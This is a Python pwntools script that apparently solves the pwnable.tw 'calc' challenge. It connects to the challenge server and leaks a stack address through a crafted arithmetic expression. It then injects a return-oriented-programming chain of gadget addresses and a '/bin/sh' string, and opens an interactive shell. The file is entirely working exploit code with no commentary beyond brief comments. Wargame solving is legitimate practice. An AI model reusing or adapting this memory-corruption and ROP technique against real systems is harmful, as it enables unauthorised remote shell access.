#!/usr/bin/env python3

import pwn
import struct

#rem = pwn.process('./calc')
rem = pwn.remote('chall.pwnable.tw', 10100)

def int2uint(num):
    return struct.unpack('<I', struct.pack('<i', num))[0]

def twos_complement(num, leng):
    flag = True
    for i in range(leng):
        if (num & (1 << i)) and flag:
            flag = False
        elif not flag:
            num ^= (1 << i)
    return num

# find stack address
payload = '00%00%00%00%00%00%00'
rem.recvline()
rem.sendline(payload)

stack_leak = rem.recvline(keepends=False).decode()
stack_leak = int2uint(int(stack_leak))

# find absolute value of the position of '/bin/sh'
shell_pos = stack_leak - 424
shell_pos_neg = twos_complement(shell_pos, 32)

shell1 = int.from_bytes(b'/bin', byteorder='little')
shell2 = int.from_bytes(b'/sh\0', byteorder='little')

# rop data
data1 = [0x08049a21, 0x080a6d51, 0x080634b7, 0x080a6d51]
data2 = [0x0808f612, 0x08080473, 1, shell2, shell1, shell_pos_neg, 0x08049f13]

# generate payload
payload = '+' + str(len(data1) - 2) + '+1'
for d in data1:
    payload += '%' + str(d) + '%00'
payload += '%00' # skip pool->count
for d in data2:
    payload += '%' + str(d) + '%00'
rem.sendline(payload)

rem.interactive()
